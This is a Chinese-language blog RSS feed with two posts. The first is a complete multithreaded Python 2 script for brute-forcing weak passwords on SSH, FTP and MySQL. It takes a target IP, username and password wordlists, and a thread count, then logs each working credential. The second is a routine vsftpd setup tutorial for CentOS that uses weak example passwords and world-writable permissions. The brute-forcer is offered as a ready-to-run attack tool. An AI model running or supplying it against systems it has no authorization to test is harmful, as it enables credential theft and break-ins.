<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ftp on </title>
    <link>http://wyb0.com/tags/ftp/</link>
    <description>Recent content in Ftp on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 26 Aug 2016 17:53:51 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/ftp/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;脚本:584a532418a1844143552a4b9dd71035&#34;&gt;脚本&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;this script can bruter ftp/ssh/mysql&#39;

__author__ = &#39;reber&#39;

import Queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import paramiko
from ftplib import FTP
import MySQLdb

#################公有类#################
class CommonFun(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;)
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print &amp;quot;###################################################################&amp;quot;
            for x in rlist:
                self.show_log(lname,x)
        else:
            print &amp;quot;not found...&amp;quot;

#################SSH爆破模块#################
class SshBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for SshBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        self.is_exit = False
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):        
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(&#39;:&#39;)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                    self.qlist.put(name + &#39;:&#39; + pwd)
                    time.sleep(3)
                except Exception, e:
                    error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################FTP爆破模块#################
class FtpBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for FtpBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(1)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for MysqlBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db=&#39;mysql&#39;, port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(3)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

def main():
    parser = OptionParser(usage=&#39;Usage: python %prog [options] type&#39;)
    parser.add_option(&#39;-i&#39;,&#39;--host&#39;,dest=&#39;host&#39;,help=&#39;target ip&#39;)
    parser.add_option(&#39;-o&#39;,&#39;--timeout&#39;,type=int,dest=&#39;timeout&#39;,default=5,help=&#39;timeout&#39;)
    parser.add_option(&#39;-t&#39;,&#39;--thread&#39;,type=int,dest=&#39;threadnum&#39;,default=10,help=&#39;threadnum&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--userfile&#39;,dest=&#39;userfile&#39;,default=&#39;username.txt&#39;,help=&#39;userfile&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;password.txt&#39;,help=&#39;passfile&#39;)

    (options, args) = parser.parse_args()

    if not args:
        parser.print_help()
        exit()

    if args[0]==&#39;ssh&#39;:
        if options.host:
            ssh = SshBruter(options, args)
            ssh.run()
        else:
            parser.print_help()
    elif args[0]==&#39;ftp&#39;:
        if options.host:
            ftp = FtpBruter(options, args)
            ftp.run()
        else:
            parser.print_help()
    elif args[0]==&#39;mysql&#39;:
        if options.host:
            mysql = MysqlBruter(options, args)
            mysql.run()
        else:
            parser.print_help()
    else:
        print &amp;quot;type must be ssh or ftp or mysql&amp;quot;

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;尝试爆破:584a532418a1844143552a4b9dd71035&#34;&gt;尝试爆破&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_help.png&#34; alt=&#34;帮助信息.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ssh.png&#34; alt=&#34;爆破SSH.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ftp.png&#34; alt=&#34;爆破FTP.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_mysql.png&#34; alt=&#34;爆破MySQL.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下搭建FTP</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BAFTP/</link>
      <pubDate>Sat, 18 Jun 2016 09:40:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BAFTP/</guid>
      <description>

&lt;pre&gt;&lt;code&gt;安装环境为：CentOS-6.5-x86_64-minimal
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;安装:0321999c3409190821365412ef440ce9&#34;&gt;安装&lt;/h2&gt;

&lt;p&gt;yum install vsftpd&lt;/p&gt;

&lt;h2 id=&#34;配置:0321999c3409190821365412ef440ce9&#34;&gt;配置&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;备份&lt;br /&gt;
cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;编辑配置文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;vim /etc/vsftpd/vsftpd.conf
anonymous_enable=NO #设定不允许匿名访问
local_enable=YES    #设定本地用户可以访问
chroot_list_enable=YES  #使用户不能离开主目录
xferlog_file=/var/log/vsftpd.log    #设定vsftpd的服务日志
ascii_upload_enable=YES
ascii_download_enable=YES   #设定支持ASCII
pam_service_name=vsftpd #PAM认证文件名,PAM将根据/etc/pam.d/vsftpd进行认证
# 并在尾部追加：
guest_enable=YES    #设定启用虚拟用户功能。
guest_username=ftp  #指定虚拟用户的宿主用户。-CentOS中已经有内置的ftp用户了
guest_config_dir=/etc/vsftpd/vuser_conf #设定虚拟用户个人vsftp的配置文件存放路径。存放虚拟用户个性化的配置文件名，和虚拟用户名相同
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;新增chroot_list并将ftp用户输入进去&lt;br /&gt;
touch /etc/vsftpd/chroot_list&lt;br /&gt;
echo ftp &amp;gt;&amp;gt; /etc/vsftpd/chroot_list&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装Berkeley DB工具用来对虚拟用户认证配置管理：&lt;br /&gt;
yum install db4 db4-utils&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;创建用户账户文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vim /etc/vsftpd/vuser_passwd.txt
user1   #奇数行是用户名
123456  #偶数行是密码
user2   #奇数行是用户名
666666  #偶数行是密码
user3   #奇数行是用户名
user3   #偶数行是密码
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;用Berkeley DB工具生成认证文件&lt;br /&gt;
db_load -T -t hash -f /etc/vsftpd/vuser_passwd.txt   /etc/vsftpd/vuser_passwd.db&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;编辑/etc/pam.d/vsftpd，注释掉所有原来内容，添加如下内容：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;auth required pam_userdb.so db=/etc/vsftpd/vuser_passwd
account required pam_userdb.so db=/etc/vsftpd/vuser_passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;针对每个用户增加个性化配置文件:0321999c3409190821365412ef440ce9&#34;&gt;针对每个用户增加个性化配置文件&lt;/h2&gt;

&lt;p&gt;配置后user1登陆后所在目录就是/var/ftphome了，而user2、user3登陆后还是在默认的/var/ftp/&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir /etc/vsftpd/vuser_conf/
vim /etc/vsftpd/vuser_conf/user1
local_root=/var/ftphome/   #此目录位置可以修改
write_enable=YES #可写
anon_umask=022 #掩码
anon_world_readable_only=NO
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
创建目录并修改权限：
mkdir /var/ftphome
chmod 777 /var/ftphome
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;启动服务:0321999c3409190821365412ef440ce9&#34;&gt;启动服务&lt;/h2&gt;

&lt;p&gt;service vsftpd start&lt;br /&gt;
此时就可以用用户名登陆ftp了(只能终端登录)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>